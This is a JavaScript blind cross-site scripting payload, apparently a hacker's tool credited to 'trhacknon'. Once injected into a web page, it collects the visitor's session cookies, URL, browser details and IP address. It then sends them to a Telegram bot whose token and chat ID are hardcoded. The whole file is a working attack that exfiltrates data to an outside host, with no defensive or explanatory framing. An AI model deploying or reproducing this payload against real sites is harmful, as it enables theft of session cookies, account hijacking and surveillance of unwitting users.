var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
var chatId = '-1001690993326'; // Your "chatId" Here

function getIPAddress(callback) {
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(null, data.ip))
        .catch(error => callback('Failed to fetch IP address', null));
}

function getClientInfo() {
    var info = `
<b>Blind XSS Alert by trhacknon</b>

<b>XSS Alert in ${document['domain']}</b>
------------------------------------------------

<b>- URL Target -</b>
<pre>${document['location']['hostname']}${document['location']['pathname']}</pre>

<b>- Document Cookie -</b>
<pre>${document['cookie']}</pre>

<b>- User Agent -</b>
<pre>${navigator.userAgent}</pre>

<b>- Platform -</b>
<pre>${navigator.platform}</pre>

<b>- Language -</b>
<pre>${navigator.language}</pre>

<b>- Online Status -</b>
<pre>${navigator.onLine}</pre>
`;

    getIPAddress(function (ipError, ipAddress) {
        if (ipError) {
            info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
        } else {
            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
            showXSSPopup(info, ipAddress); // Appel de la fonction pour afficher le popup avec l'adresse IP
        }

        telegramSend(info);
    });
}

function showXSSPopup(info, ipAddress) {
    var popupContent = `
XSS Alert by trhacknon
------------------------

${info}

- IP Address -
${ipAddress}
`;

    alert(popupContent);
}

function telegramSend(textData) {
    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textData)}&parse_mode=html`)
        .catch(error => console.error('Failed to send message to Telegram:', error));
}

// Appeler la fonction pour obtenir les informations client
getClientInfo();
